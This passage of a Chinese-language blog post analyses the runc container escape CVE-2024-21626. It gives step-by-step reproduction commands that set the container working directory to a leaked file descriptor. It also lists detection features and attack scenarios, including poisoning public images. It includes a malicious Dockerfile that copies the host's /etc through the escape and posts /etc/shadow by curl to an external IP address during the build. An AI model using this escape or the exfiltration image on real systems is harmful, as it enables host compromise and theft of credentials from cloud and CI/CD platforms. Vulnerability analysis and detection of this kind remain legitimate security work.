+&lt;p>利用思路：runc创建子进程时 &amp;amp;&amp;amp; exec/run即将执行的二进制文件还没关闭之前，将process.cwd设置为&lt;code>/proc/self/fd/7&lt;/code>，此时这个二进制进程的&lt;code>/proc/[pid]/cwd&lt;/code>就会指向容器外的&lt;code>/sys/fs/cgroup&lt;/code>，之后的子进程就可以利用该fd的&lt;code>/proc/self/fd/[fdnum]&lt;/code>来访问宿主机的文件系统&lt;/p>
+&lt;p>至于最初为什么要检查&lt;code>openat2&lt;/code>，是因为&lt;code>openat(2)&lt;/code>可以避免在容器的mount命名空间中挂载宿主机文件系统的目录时存在逃逸的风险，但最终又引入了新的问题&lt;/p>
+&lt;h2 id="复现">复现&lt;/h2>
+&lt;p>可以不使用完整docker 直接复现runc漏洞&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 将基本镜像导出rootfs&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker run --name helper-ctr alpine
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>docker &lt;span style="color:#111">export&lt;/span> helper-ctr --output alpine.tar
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mkdir rootfs
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>tar xf alpine.tar -C rootfs
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 使用runc命令创建默认配置文件&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>runc spec
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 修改运行时指定的cwd&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sed -ri &lt;span style="color:#d88200">&amp;#39;s#(\s*&amp;#34;cwd&amp;#34;: )&amp;#34;(/)&amp;#34;#\1 &amp;#34;/proc/self/fd/7&amp;#34;#g&amp;#39;&lt;/span> config.json
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>grep cwd config.json
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># exploit&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sudo runc --log ./log.json run demo
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20240213174402355.png" alt="image-20240213174402355">&lt;/p>
+&lt;p>注意到我们把cwd指定为&lt;code>/proc/self/fd/7&lt;/code>，这个数字和golang运行时有关&lt;/p>
+&lt;p>0, 1, 2分别是标准输入 标准输出和标准错误，3是日志文件，golang程序刚启动时会创建一个epoll文件描述符4和一个管道(5, 6)，接着初始化cgroup管理模块时打开&lt;code>/sys/fs/cgroup&lt;/code>目录7&lt;/p>
+&lt;p>但在使用docker run创建的容器中 &lt;code>/sys/fs/cgroup&lt;/code>的文件描述符是8，但有时也是7（详细原因暂略 看不懂）&lt;/p>
+&lt;p>另外一个细节是&lt;code>--log&lt;/code>，如果不指定log参数 &lt;code>/sys/fs/cgroup&lt;/code>目录的文件描述符就会是3，无法利用（原因略 看不懂）&lt;/p>
+&lt;h2 id="利用">利用&lt;/h2>
+&lt;p>利用过程中的几条特征&lt;/p>
+&lt;ul>
+&lt;li>在容器中产生cwd 形如&lt;code>/proc/self/fd/[fd]&lt;/code>的进程&lt;/li>
+&lt;li>在容器中产生目标目录为&lt;code>/proc/self/fd/[fd]&lt;/code>的&lt;code>symlink(2)&lt;/code>或&lt;code>symlinkat(2)&lt;/code>的系统调用&lt;/li>
+&lt;li>在容器中产生open/openat/openat2系统调用，且文件名有&lt;code>/proc/\d+/cwd/.*&lt;/code> 的正则表达式特征&lt;/li>
+&lt;/ul>
+&lt;p>利用场景（主要针对云服务）：&lt;/p>
+&lt;ul>
+&lt;li>制作恶意镜像 投毒公共库&lt;/li>
+&lt;li>CI/CD平台控制work dir 导致漏洞&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>FROM ubuntu:latest
+WORKDIR /proc/self/fd/7
+RUN cp -r ../../../../../etc /hostetc
+WORKDIR /
+RUN apt update &amp;amp;&amp;amp; apt-get install -y --no-install-recommends curl ca-certificates
+RUN curl -XPOST --data-binary @/hostetc/shadow http://165.154.148.13:10399/
+&lt;/code>&lt;/pre>&lt;p>以上恶意镜像 在build阶段就可以把敏感文件带出 无需实际运行&lt;/p>
+&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20240213212602227.png" alt="image-20240213212602227">&lt;/p>
+&lt;p>参考文章：https://github.com/NitroCao/CVE-2024-21626&lt;/p></description></item></channel></rss>
